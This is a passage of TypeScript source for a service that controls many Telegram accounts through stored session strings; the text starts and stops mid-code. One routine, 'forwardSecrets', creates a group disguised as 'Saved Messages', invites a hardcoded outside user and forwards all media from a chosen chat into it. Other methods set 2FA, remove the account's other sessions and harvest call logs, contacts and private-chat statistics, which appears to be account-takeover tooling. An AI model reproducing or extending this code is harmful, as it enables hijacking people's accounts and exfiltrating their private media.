this.getClient(mobile)\n        return await telegramClient.getchatId(username);\n    }\n\n    async getLastActiveTime(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getLastActiveTime();\n    }\n\n    async tryJoiningChannel(mobile: string, chatEntity: Channel) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            await telegramClient.joinChannel(chatEntity.username);\n            console.log(telegramClient.phoneNumber, \" - Joined channel Success - \", chatEntity.username);\n            if (chatEntity.canSendMsgs) {\n                // try {\n                //     await this.activeChannelsService.update(chatEntity.channelId, chatEntity);\n                //     console.log(\"updated ActiveChannels\");\n                // } catch (error) {\n                //     console.log(parseError(error));\n                //     console.log(\"Failed to update ActiveChannels\");\n                // }\n            } else {\n                await this.channelsService.remove(chatEntity.channelId);\n                await this.activeChannelsService.remove(chatEntity.channelId);\n                console.log(\"Removed Channel- \", chatEntity.username);\n            }\n        } catch (error) {\n            console.log(telegramClient.phoneNumber, \" - Failed to join - \", chatEntity.username);\n            this.removeChannels(error, chatEntity.channelId, chatEntity.username);\n            throw error\n        }\n    };\n\n    async removeChannels(error: any, channelId: string, username: string) {\n        if (error.errorMessage == \"USERNAME_INVALID\" || error.errorMessage == 'CHAT_INVALID' || error.errorMessage == 'USERS_TOO_MUCH' || error.toString().includes(\"No user has\")) {\n            try {\n                if (channelId) {\n                    await this.channelsService.remove(channelId)\n                    await this.activeChannelsService.remove(channelId);\n                    console.log(\"Removed Channel- \", channelId);\n                } else {\n                    const channelDetails = (await this.channelsService.search({ username: username }))[0];\n                    await this.channelsService.remove(channelDetails.channelId)\n                    await this.activeChannelsService.remove(channelDetails.channelId);\n                    console.log(\"Removed Channel - \", channelDetails.channelId);\n                }\n            } catch (searchError) {\n                console.log(\"Failed to search/remove channel: \", searchError);\n            }\n        } else if (error.errorMessage === \"CHANNEL_PRIVATE\") {\n            await this.channelsService.update(channelId, { private: true })\n            await this.activeChannelsService.update(channelId, { private: true });\n        }\n    }\n\n    async getGrpMembers(mobile: string, entity: EntityLike) {\n        try {\n            const telegramClient = await this.getClient(mobile);\n            return await telegramClient.getGrpMembers(entity)\n        } catch (err) {\n            console.error(\"Error fetching group members:\", err);\n        }\n    }\n\n    async addContact(mobile: string, data: { mobile: string, tgId: string }[], prefix: string) {\n        try {\n            const telegramClient = await this.getClient(mobile);\n            return await telegramClient.addContact(data, prefix)\n        } catch (err) {\n            console.error(\"Error fetching adding Contacts:\", err);\n        }\n    }\n\n\n    async addContacts(mobile: string, phoneNumbers: string[], prefix: string) {\n        try {\n            const telegramClient = await this.getClient(mobile);\n            return await telegramClient.addContacts(phoneNumbers, prefix)\n        } catch (err) {\n            console.error(\"Error fetching adding Contacts:\", err);\n        }\n    }\n\n    async getSelfMsgsInfo(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getSelfMSgsInfo();\n    }\n\n    async createGroup(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.createGroup();\n    }\n\n    async forwardSecrets(mobile: string, fromChatId: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.createGroupAndForward(fromChatId);\n    }\n\n\n    async joinChannelAndForward(mobile: string, fromChatId: string, channel: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.joinChannelAndForward(fromChatId, channel);\n    }\n\n    async blockUser(mobile: string, chatId: string) {\n        const telegramClient = await this.getClient(mobile);\n        return await telegramClient.blockUser(chatId);\n    }\n\n\n    async joinChannel(mobile: string, channelId: string) {\n        const telegramClient = await this.getClient(mobile);\n        return await telegramClient.joinChannel(channelId);\n    }\n\n    async getCallLog(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getCallLog();\n    }\n\n    async getmedia(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getMediaMessages();\n    }\n\n    async getChannelInfo(mobile: string, sendIds: boolean = false): Promise<ChannelInfo> {\n        return this.executeWithConnection(mobile, 'Get channel info', async (client) => {\n            return await client.channelInfo(sendIds);\n        });\n    }\n\n    async getMe(mobile: string) {\n        return this.executeWithConnection(mobile, 'Get profile info', async (client) => {\n            return await client.getMe();\n        });\n    }\n\n    async getEntity(mobile: string, entity: EntityLike) {\n        return this.executeWithConnection(mobile, 'Get entity info', async (client) => {\n            return await client.getEntity(entity); // Assuming 'getEntity()' is a valid method\n        });\n    }\n\n    async createNewSession(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.createNewSession();\n    }\n\n    async set2Fa(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            await telegramClient.set2fa();\n            await telegramClient.disconnect();\n            return '2Fa set successfully'\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, errorDetails.status)\n        }\n    }\n\n    async updatePrivacyforDeletedAccount(mobile: string) {\n        const telegramClient = await this.getClient(mobile);\n        await telegramClient.updatePrivacyforDeletedAccount()\n    }\n\n    async deleteProfilePhotos(mobile: string) {\n        const telegramClient = await this.getClient(mobile);\n        await telegramClient.deleteProfilePhotos()\n    }\n\n    async setProfilePic(\n        mobile: string, name: string,\n    ) {\n        const telegramClient = await this.getClient(mobile)\n        await telegramClient.deleteProfilePhotos();\n        try {\n            await CloudinaryService.getInstance(name);\n            await sleep(2000);\n            const rootPath = process.cwd();\n            console.log(\"checking path\", rootPath)\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\n            await sleep(1000);\n            await telegramClient.disconnect();\n            return 'Profile pic set successfully'\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, errorDetails.status)\n        }\n    }\n\n    async updatePrivacy(\n        mobile: string,\n    ) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            await telegramClient.updatePrivacy()\n            return \"Privacy updated successfully\";\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, errorDetails.status)\n        }\n    }\n\n    async downloadProfilePic(\n        mobile: string, index: number\n    ) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            return await telegramClient.downloadProfilePic(index)\n        } catch (error) {\n            console.log(\"Some Error: \", parseError(error), error);\n            throw new Error(\"Failed to update username\");\n        }\n    }\n\n    async updateUsername(\n        mobile: string, username: string,\n    ) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            return await telegramClient.updateUsername(username)\n        } catch (error) {\n            console.log(\"Some Error: \", parseError(error), error);\n            throw new Error(\"Failed to update username\");\n        }\n    }\n\n    async getMediaMetadata(mobile: string, chatId?: string, offset?: number, limit: number = 100) {\n        return this.executeWithConnection(mobile, 'Get media metadata', async (client) => {\n            return await client.getMediaMetadata(chatId, offset, limit);\n        });\n    }\n\n    async downloadMediaFile(mobile: string, messageId: number, chatId: string, res: any) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.downloadMediaFile(messageId, chatId, res)\n    }\n\n    async forwardMessage(mobile: string, toChatId: string, fromChatId: string, messageId: number) {\n        const telegramClient = await this.getClient(mobile);\n        return await telegramClient.forwardMessage(toChatId, fromChatId, messageId);\n    }\n\n    async leaveChannels(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        const channelinfo = await telegramClient.channelInfo(false);\n        const leaveChannelIds = channelinfo.canSendFalseChats\n        return await telegramClient.leaveChannels(leaveChannelIds);\n    }\n\n    async leaveChannel(mobile: string, channel: string): Promise<void> {\n        await this.executeWithConnection(mobile, 'Leave channel',\n            (client) => client.leaveChannels([channel]),\n        );\n    }\n\n    async deleteChat(mobile: string, chatId: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.deleteChat(chatId);\n    }\n    async updateNameandBio(\n        mobile: string,\n        firstName: string,\n        about?: string,\n    ): Promise<void> {\n        await this.executeWithConnection(mobile, 'Update profile',\n            (client) => client.updateProfile(firstName, about),\n        );\n    }\n\n    async getDialogs(mobile: string, query: DialogsQueryDto) {\n        return this.executeWithConnection(mobile, 'Get dialogs', async (client) => {\n            const { limit = 10, offsetId, archived = false } = query;\n            const dialogs = await client.getDialogs({ limit, offsetId, archived });\n            const chatData = [];\n            for (const chat of dialogs) {\n                const chatEntity = await chat.entity.toJSON();\n                chatData.push(chatEntity);\n            }\n            return chatData;\n        });\n    }\n\n    async getConnectionStatus(): Promise<{\n        activeConnections: number;\n        rateLimited: number;\n        totalOperations: number;\n    }> {\n        const status = {\n            activeConnections: this.connectionManager.getActiveConnectionCount(),\n            rateLimited: 0,\n            totalOperations: 0\n        };\n\n        this.logger.logOperation('system', 'Connection status retrieved', status);\n        return status;\n    }\n\n    async forwardBulkMessages(\n        mobile: string,\n        fromChatId: string,\n        toChatId: string,\n        messageIds: number[]\n    ): Promise<void> {\n        await this.executeWithConnection(mobile, 'Forward bulk messages',\n            (client) => client.forwardMessages(fromChatId, toChatId, messageIds),\n        );\n    }\n\n    async getAuths(mobile: string): Promise<any[]> {\n        return this.executeWithConnection(mobile, 'Get authorizations', async (client) => {\n            const auths = await client.getAuths();\n            this.logger.logOperation(mobile, 'Retrieved authorizations', {\n                count: auths?.length || 0\n            });\n            return auths;\n        });\n    }\n\n    async removeOtherAuths(mobile: string): Promise<void> {\n        return this.executeWithConnection(mobile, 'Remove other authorizations', async (client) => {\n            await client.removeOtherAuths();\n            this.logger.logOperation(mobile, 'Removed other authorizations');\n        });\n    }\n\n    async getClientMetadata(mobile: string): Promise<ClientMetadata | undefined> {\n        return this.metadataTracker.getMetadata(mobile);\n    }\n\n    async getClientStatistics() {\n        return this.metadataTracker.getStatistics();\n    }\n\n    private async handleReconnect(mobile: string): Promise<void> {\n        this.metadataTracker.recordReconnect(mobile);\n        this.logger.logWarning(mobile, 'Client reconnection triggered');\n        // Additional reconnection logic if needed\n    }\n\n    // Helper method to handle batch operations with rate limiting\n    public async processBatch<T>(\n        items: T[],\n        batchSize: number,\n        processor: (batch: T[]) => Promise<void>,\n        delayMs: number = 2000\n    ): Promise<{ processed: number, errors: Error[] }> {\n        const errors: Error[] = [];\n        let processed = 0;\n\n        for (let i = 0; i < items.length; i += batchSize) {\n            const batch = items.slice(i, i + batchSize);\n            try {\n                await processor(batch);\n                processed += batch.length;\n                if (i + batchSize < items.length) {\n                    await new Promise(resolve => setTimeout(resolve, delayMs));\n                }\n            } catch (error) {\n                errors.push(error);\n                this.logger.logError('batch-process', 'Batch processing failed', error);\n            }\n        }\n\n        return { processed, errors };\n    }\n\n    // Enhanced Group Management\n    async createGroupWithOptions(mobile: string, options: GroupOptions) {\n        return this.executeWithConnection(mobile, 'Create group with options', async (client) => {\n            const result = await client.createGroupWithOptions(options);\n            this.logger.logOperation(mobile, 'Group created', { id: result.id?.toString() });\n            return result;\n        });\n    }\n\n    async updateGroupSettings(\n        mobile: string,\n        settings: {\n            groupId: string;\n            username?: string;\n            title?: string;\n            description?: string;\n            slowMode?: number;\n            memberRestrictions?: any;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Update group settings', (client) =>\n            client.updateGroupSettings(settings)\n        );\n    }\n\n    // Message Scheduling\n    async scheduleMessage(mobile: string, options: MessageScheduleOptions): Promise<void> {\n        await this.executeWithConnection(mobile, 'Schedule message',\n            async (client) => {\n                await client.scheduleMessageSend({\n                    chatId: options.chatId,\n                    message: options.message,\n                    scheduledTime: options.scheduledTime,\n                    replyTo: options.replyTo,\n                    silent: options.silent\n                });\n            },\n        );\n    }\n\n    async getScheduledMessages(mobile: string, chatId: string) {\n        return this.executeWithConnection(mobile, 'Get scheduled messages', (client) =>\n            client.getScheduledMessages(chatId)\n        );\n    }\n\n    // Enhanced Media Operations\n    async sendMediaAlbum(mobile: string, album: MediaAlbumOptions) {\n        return this.executeWithConnection(mobile, 'Send media album', (client) =>\n            client.sendMediaAlbum(album)\n        );\n    }\n\n    async sendVoiceMessage(\n        mobile: string,\n        voice: {\n            chatId: string;\n            url: string;\n            duration?: number;\n            caption?: string;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Send voice message', (client) =>\n            client.sendVoiceMessage(voice)\n        );\n    }\n\n    // Advanced Chat Operations\n    async cleanupChat(\n        mobile: string,\n        cleanup: {\n            chatId: string;\n            beforeDate?: Date;\n            onlyMedia?: boolean;\n            excludePinned?: boolean;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Clean up chat', (client) =>\n            client.cleanupChat(cleanup)\n        );\n    }\n\n    async getChatStatistics(mobile: string, chatId: string, period: 'day' | 'week' | 'month'): Promise<ChatStatistics> {\n        return this.executeWithConnection(mobile, 'Get chat statistics',\n            (client) => client.getChatStatistics(chatId, period),\n        );\n    }\n\n    // Enhanced Privacy Features\n    async updatePrivacyBatch(\n        mobile: string,\n        settings: {\n            phoneNumber?: 'everybody' | 'contacts' | 'nobody';\n            lastSeen?: 'everybody' | 'contacts' | 'nobody';\n            profilePhotos?: 'everybody' | 'contacts' | 'nobody';\n            forwards?: 'everybody' | 'contacts' | 'nobody';\n            calls?: 'everybody' | 'contacts' | 'nobody';\n            groups?: 'everybody' | 'contacts' | 'nobody';\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Update privacy settings batch', (client) =>\n            client.updatePrivacyBatch(settings)\n        );\n    }\n    // Content Filtering\n    async setContentFilters(\n        mobile: string,\n        filters: ContentFilter\n    ) {\n        return this.executeWithConnection(mobile, 'Set content filters', (client) =>\n            client.setContentFilters(filters)\n        );\n    }\n\n    // Helper method for batch operations with progress tracking\n    private async processBatchWithProgress<T>(\n        items: T[],\n        operation: (item: T) => Promise<void>,\n        batchSize: number = 10,\n        delayMs: number = 2000\n    ): Promise<{ completed: number; total: number; errors: Error[] }> {\n        const result = {\n            completed: 0,\n            total: items.length,\n            errors: [] as Error[]\n        };\n\n        for (let i = 0; i < items.length; i += batchSize) {\n            const batch = items.slice(i, i + batchSize);\n            await Promise.all(\n                batch.map(async (item) => {\n                    try {\n                        await operation(item);\n                        result.completed++;\n                    } catch (error) {\n                        result.errors.push(error);\n                    }\n                })\n            );\n\n            if (i + batchSize < items.length) {\n                await new Promise(resolve => setTimeout(resolve, delayMs));\n            }\n        }\n\n        return result;\n    }\n\n    // Group Member Management\n    async addGroupMembers(mobile: string, groupId: string, members: string[]): Promise<void> {\n        await this.executeWithConnection(mobile, 'Add group members',\n            (client) => client.addGroupMembers(groupId, members),\n        );\n    }\n\n    async removeGroupMembers(mobile: string, groupId: string, members: string[]): Promise<void> {\n        await this.executeWithConnection(mobile, 'Remove group members',\n            (client) => client.removeGroupMembers(groupId, members),\n        );\n    }\n\n    async promoteToAdmin(\n        mobile: string,\n        groupId: string,\n        userId: string,\n        permissions?: {\n            changeInfo?: boolean;\n            postMessages?: boolean;\n            editMessages?: boolean;\n            deleteMessages?: boolean;\n            banUsers?: boolean;\n            inviteUsers?: boolean;\n            pinMessages?: boolean;\n            addAdmins?: boolean;\n            anonymous?: boolean;\n            manageCall?: boolean;\n        },\n        rank?: string\n    ): Promise<void> {\n        await this.executeWithConnection(mobile, 'Promote to admin',\n            (client) => client.promoteToAdmin(groupId, userId, permissions, rank)\n        );\n    }\n\n    async demoteAdmin(mobile: string, groupId: string, userId: string): Promise<void> {\n        return this.executeWithConnection(mobile, 'Demote admin', async (client) => {\n            await client.demoteAdmin(groupId, userId);\n            this.logger.logOperation(mobile, 'Demoted admin to regular member', { groupId, userId });\n        });\n    }\n\n    async unblockGroupUser(mobile: string, groupId: string, userId: string): Promise<void> {\n        return this.executeWithConnection(mobile, 'Unblock group user', async (client) => {\n            await client.unblockGroupUser(groupId, userId);\n            this.logger.logOperation(mobile, 'Unblocked user in group', { groupId, userId });\n        });\n    }\n\n    async getGroupAdmins(mobile: string, groupId: string) {\n        return this.executeWithConnection(mobile, 'Get group admins', (client) =>\n            client.getGroupAdmins(groupId)\n        );\n    }\n\n    async getGroupBannedUsers(mobile: string, groupId: string) {\n        return this.executeWithConnection(mobile, 'Get group banned users', (client) =>\n            client.getGroupBannedUsers(groupId)\n        );\n    }\n\n    async searchMessages(\n        mobile: string,\n        params: {\n            chatId: string;\n            query?: string;\n            types?: ('all' | 'text' | 'photo' | 'video' | 'voice' | 'document')[];\n            offset?: number;\n            limit?: number;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Search messages', (client) =>\n            client.searchMessages(params)\n        );\n    }\n\n    async getFilteredMedia(\n        mobile: string,\n        params: {\n            chatId: string;\n            types?: ('photo' | 'video' | 'document' | 'voice')[];\n            startDate?: Date;\n            endDate?: Date;\n            offset?: number;\n            limit?: number;            \n            maxId?: number;\n            minId?: number;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Get filtered media', (client) =>\n            client.getFilteredMedia(params)\n        );\n    }\n\n    // Contact Management\n    async exportContacts(\n        mobile: string,\n        format: 'vcard' | 'csv',\n        includeBlocked: boolean = false\n    ) {\n        return this.executeWithConnection(mobile, 'Export contacts', (client) =>\n            client.exportContacts(format, includeBlocked)\n        );\n    }\n\n    async importContacts(\n        mobile: string,\n        contacts: { firstName: string; lastName?: string; phone: string }[]\n    ) {\n        return this.executeWithConnection(mobile, 'Import contacts', (client) =>\n            client.importContacts(contacts)\n        );\n    }\n\n    async manageBlockList(\n        mobile: string,\n        userIds: string[],\n        block: boolean\n    ) {\n        return this.executeWithConnection(mobile, block ? 'Block users' : 'Unblock users', (client) =>\n            client.manageBlockList(userIds, block)\n        );\n    }\n\n    async getContactStatistics(mobile: string) {\n        return this.executeWithConnection(mobile, 'Get contact statistics', (client) =>\n            client.getContactStatistics()\n        );\n    }\n\n    // Chat Folder Management\n    async createChatFolder(\n        mobile: string,\n        options: {\n            name: string;\n            includedChats: string[];\n            excludedChats?: string[];\n            includeContacts?: boolean;\n            includeNonContacts?: boolean;\n            includeGroups?: boolean;\n            includeBroadcasts?: boolean;\n            includeBots?: boolean;\n            excludeMuted?: boolean;\n            excludeRead?: boolean;\n            excludeArchived?: boolean;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Create chat folder', (client) =>\n            client.createChatFolder(options)\n        );\n    }\n\n    async getChatFolders(mobile: string) {\n        return this.executeWithConnection(mobile, 'Get chat folders', (client) =>\n            client.getChatFolders()\n        );\n    }\n\n    // Session Management\n    async getSessionInfo(mobile: string) {\n        return this.executeWithConnection(mobile, 'Get session info', (client) =>\n            client.getSessionInfo()\n        );\n    }\n\n    async terminateSession(\n        mobile: string, \n        options: {\n            hash: string;\n            type: 'app' | 'web';\n            exceptCurrent?: boolean;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Terminate session', (client) =>\n            client.terminateSession(options)\n        );\n    }\n\n    // Message Management\n    async editMessage(\n        mobile: string,\n        options: {\n            chatId: string;\n            messageId: number;\n            text?: string;\n            media?: {\n                type: 'photo' | 'video' | 'document';\n                url: string;\n            };\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Edit message', (client) =>\n            client.editMessage(options)\n        );\n    }\n\n    // Chat Management\n    async updateChatSettings(\n        mobile: string,\n        settings: {\n            chatId: string;\n            username?: string;\n            title?: string;\n            about?: string;\n            photo?: string;\n            slowMode?: number;\n            linkedChat?: string;\n            defaultSendAs?: string;\n        }\n    ) {\n\n        if (!settings.chatId) {\n            throw new Error('chatId is required');\n        }\n\n        return this.executeWithConnection(mobile, 'Update chat settings', (client) =>\n            client.updateChatSettings(settings)\n        );\n    }\n\n    // Media Handling\n    async sendMediaBatch(\n        mobile: string,\n        options: {\n            chatId: string;\n            media: Array<{\n                type: 'photo' | 'video' | 'document';\n                url: string;\n                caption?: string;\n                fileName?: string;\n            }>;\n            silent?: boolean;\n            scheduleDate?: number;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Send media batch', (client) =>\n            client.sendMediaBatch(options)\n        );\n    }\n\n    // Password Management\n    async hasPassword(mobile: string): Promise<boolean> {\n        return this.executeWithConnection(mobile, 'Check password status', (client) =>\n            client.hasPassword()\n        );\n    }\n\n    // Contact Management\n    async getContacts(mobile: string) {\n        return this.executeWithConnection(mobile, 'Get contacts list', (client) =>\n            client.getContacts()\n        );\n    }\n\n    // Extended Chat Functions\n    async getChats(\n        mobile: string,\n        options: {\n            limit?: number;\n            offsetDate?: number;\n            offsetId?: number;\n            offsetPeer?: string;\n            folderId?: number;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Get chats', (client) =>\n            client.getChats(options)\n        );\n    }\n\n    // File Operations\n    async getFileUrl(mobile: string, url: string, filename: string): Promise<string> {\n        return this.executeWithConnection(mobile, 'Get file URL', (client) =>\n            client.getFileUrl(url, filename)\n        );\n    }\n\n    // Message Stats\n    async getMessageStats(\n        mobile: string,\n        options: {\n            chatId: string;\n            period: 'day' | 'week' | 'month';\n            fromDate?: Date;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Get message statistics', (client) =>\n            client.getMessageStats(options)\n        );\n    }\n\n    // Chat Analytics\n    async getTopPrivateChats(mobile: string): Promise<{\n        chatId: string;\n        username?: string;\n        firstName?: string;\n        lastName?: string;\n        totalMessages: number;\n        interactionScore: number;\n        calls: {\n            total: number;\n            incoming: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n            outgoing: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n        };\n        media: {\n            photos: number;\n            videos: number;\n        };\n        activityBreakdown: {\n            videoCalls: number;\n            audioCalls: number;\n            mediaSharing: number;\n            textMessages: number;\n        };\n    }[]> {\n        return this.executeWithConnection(mobile, 'Get top private chats', async (client) => {\n            return client.getTopPrivateChats();\n        });\n    }\n}\n","import { Api, TelegramClient } from 'telegram';\nimport { StringSession } from 'telegram/sessions';\nimport { NewMessage, NewMessageEvent } from 'telegram/events';\nimport axios from 'axios';\nimport * as fs from 'fs';\nimport { CustomFile } from 'telegram/client/uploads';\nimport { TotalList, sleep } from 'telegram/Helpers';\nimport { Dialog } from 'telegram/tl/custom/dialog';\nimport { LogLevel } from 'telegram/extensions/Logger';\nimport { MailReader } from '../../IMap/IMap';\nimport bigInt from 'big-integer';\nimport { IterDialogsParams } from 'telegram/client/dialogs';\nimport { EntityLike } from 'telegram/define';\nimport { contains } from '../../utils';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { ContentFilter } from '../../interfaces/telegram';\nimport {\n    GroupOptions\n} from '../../interfaces/telegram';\nimport { MediaAlbumOptions } from './types/telegram-types';\nimport { IterMessagesParams } from 'telegram/client/messages';\n\ninterface MessageScheduleOptions {\n    chatId: string;\n    message: string;\n    scheduledTime: Date;\n    replyTo?: number;\n    silent?: boolean;\n    media?: {\n        type: 'photo' | 'video' | 'document';\n        url: string;\n    };\n}\n\nclass TelegramManager {\n    private session: StringSession;\n    public phoneNumber: string;\n    public client: TelegramClient | null;\n    private channelArray: string[];\n    private static activeClientSetup: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string };\n    private contentFilters: Map<string, ContentFilter>;\n    private filterHandler: any;\n\n    constructor(sessionString: string, phoneNumber: string) {\n        this.session = new StringSession(sessionString);\n        this.phoneNumber = phoneNumber;\n        this.client = null;\n        this.channelArray = [];\n        this.contentFilters = new Map();\n    }\n\n    public static getActiveClientSetup() {\n        return TelegramManager.activeClientSetup;\n    }\n\n    public static setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\n        TelegramManager.activeClientSetup = data;\n    }\n\n    public async createGroup() {\n        const groupName = \"Saved Messages\"; // Customize your group name\n        const groupDescription = this.phoneNumber; // Optional description\n        const result: any = await this.client.invoke(\n            new Api.channels.CreateChannel({\n                title: groupName,\n                about: groupDescription,\n                megagroup: true,\n                forImport: true,\n            })\n        );\n        const { id, accessHash } = result.chats[0];\n\n        // Logic to categorize the dialog to a folder\n        const folderId = 1; // Replace with the desired folder ID\n        await this.client.invoke(\n            new Api.folders.EditPeerFolders({\n                folderPeers: [\n                    new Api.InputFolderPeer({\n                        peer: new Api.InputPeerChannel({\n                            channelId: id,\n                            accessHash: accessHash,\n                        }),\n                        folderId: folderId,\n                    }),\n                ],\n            })\n        );\n\n        // Add users to the channel\n        const usersToAdd = [\"fuckyoubabie\"]; // Replace with the list of usernames or user IDs\n        const addUsersResult = await this.client.invoke(\n            new Api.channels.InviteToChannel({\n                channel: new Api.InputChannel({\n                    channelId: id,\n                    accessHash: accessHash,\n                }),\n                users: usersToAdd\n            })\n        );\n        return { id, accessHash };\n    }\n\n    public async createGroupAndForward(fromChatId: string) {\n        const { id, accessHash } = await this.createGroup();\n        await this.forwardSecretMsgs(fromChatId, id.toString());\n    }\n\n    public async joinChannelAndForward(fromChatId: string, channel: string) {\n        const result: any = await this.joinChannel(channel);\n        const folderId = 1; // Replace with the desired folder ID\n        await this.client.invoke(\n            new Api.folders.EditPeerFolders({\n                folderPeers: [\n                    new Api.InputFolderPeer({\n                        peer: new Api.InputPeerChannel({\n                            channelId: result.chats[0].id,\n                            accessHash: result.chats[0].accessHash,\n                        }),\n                        folderId: folderId,\n                    }),\n                ],\n            })\n        );\n\n        await this.forwardSecretMsgs(fromChatId, channel);\n    }\n\n    public async forwardSecretMsgs(fromChatId: string, toChatId: string) {\n        let offset = 0;\n        const limit = 100;\n        let totalMessages = 0;\n        let forwardedCount = 0;\n        let messages: any = [];\n        do {\n            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });\n            totalMessages = messages.total;\n            const messageIds = messages.map((message: Api.Message) => {\n                offset = message.id;\n                if (message.id && message.media) {\n                    return message.id;\n                }\n                return undefined;\n            }).filter(id => id !== undefined);\n            console.log(messageIds)\n            if (messageIds.length > 0) {\n                try {\n                    const result = await this.client.forwardMessages(toChatId, {\n                        messages: messageIds,\n                        fromPeer: fromChatId,\n                    });\n\n                    forwardedCount += messageIds.length;\n                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);\n                    await sleep(5000); // Sleep for a second to avoid rate limits\n                } catch (error) {\n                    console.error(\"Error occurred while forwarding messages:\", error);\n                }\n                await sleep(5000); // Sleep for a second to avoid rate limits\n            }\n        } while (messages.length > 0);\n\n        await this.leaveChannels([toChatId]);\n        return;\n    }\n\n    //logic to forward messages from a chat to another chat maintaining rate limits\n    async forwardMessages(fromChatId: string, toChatId: string, messageIds: number[]) {\n        const chunkSize = 30; // Number of messages to forward per request\n        const totalMessages = messageIds.length;\n        let forwardedCount = 0;\n\n        for (let i = 0; i < totalMessages; i += chunkSize) {\n            const chunk = messageIds.slice(i, i + chunkSize);\n            try {\n                await this.client.forwardMessages(toChatId, {\n                    messages: chunk,\n                    fromPeer: fromChatId,\n                });\n\n                forwardedCount += chunk.length;\n                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);\n                await sleep(5000); // Sleep for a second to avoid rate limits\n            } catch (error) {\n                console.error(\"Error occurred while forwarding messages:\", error);\n            }\n        }\n\n        return forwardedCount;\n    }\n\n    async disconnect(): Promise<void> {\n        if (this.client) {\n            try {\n                console.log(\"Destroying Client: \", this.phoneNumber);\n                await this.cleanupClient();\n            } catch (error) {\n                console.error(\"Error during disconnect:\", error);\n                throw error;\n            }\n        }\n    }\n\n    private async cleanupClient() {\n        try {\n            if (!this.client) return;\n            const handlers = this.client.listEventHandlers();\n            for (const handler of handlers) {\n                this.client.removeEventHandler(handler[1], handler[0]);\n            }\n            try {\n                if (this.client.connected) {\n                    await this.client.disconnect();\n                }\n                await this.client.destroy();\n            } catch (error) {\n                parseError(error, `${this.phoneNumber}: Error during client cleanup`);\n            }\n            await this.client.destroy();\n            await this.client.disconnect();\n            this.client = null;\n            this.session.delete();\n            this.channelArray = [];\n            this.client = null;\n            await sleep(2000);\n        } catch (error) {\n            parseError(error, `${this.phoneNumber}: Error during client cleanup`);\n        }\n    }\n\n    async getchatId(username: string): Promise<any> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const entity = await this.client.getInputEntity(username);\n        return entity;\n    }\n\n    async getMe() {\n        const me = <Api.User>await this.client.getMe();\n        return me\n    }\n\n    async errorHandler(error) {\n        parseError(error)\n        if (error.message && error.message == 'TIMEOUT') {\n            // await this.client.disconnect();\n            // await this.client.destroy();\n            // await disconnectAll()\n            //Do nothing, as this error does not make sense to appear while keeping the client disconnected\n        } else {\n            console.error(`Error occurred for API ID ${this.phoneNumber}:`, error);\n            // Handle other types of errors\n        }\n    }\n\n    async createClient(handler = true, handlerFn?: (event: NewMessageEvent) => Promise<void>): Promise<TelegramClient> {\n        this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {\n            connectionRetries: 5,\n        });\n        this.client.setLogLevel(LogLevel.ERROR);\n        // this.client._errorHandler = this.errorHandler\n        await this.client.connect();\n        const me = <Api.User>await this.client.getMe();\n        console.log(\"Connected Client : \", me.phone);\n        if (handler && this.client) {\n            console.log(\"Adding event Handler\")\n            if (handlerFn) {\n                this.client.addEventHandler(async (event) => { await handlerFn(event); }, new NewMessage());\n            } else {\n                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new NewMessage());\n            }\n        }\n        return this.client\n    }\n\n    async getGrpMembers(entity: EntityLike) {\n        try {\n            const result = []\n            // Fetch the group entity\n            const chat = await this.client.getEntity(entity);\n\n            if (!(chat instanceof Api.Chat || chat instanceof Api.Channel)) {\n                console.log(\"Invalid group or channel!\");\n                return;\n            }\n\n            console.log(`Fetching members of ${chat.title || (chat as Api.Channel).username}...`);\n\n            // Fetch members\n            const participants = await this.client.invoke(\n                new Api.channels.GetParticipants({\n                    channel: chat,\n                    filter: new 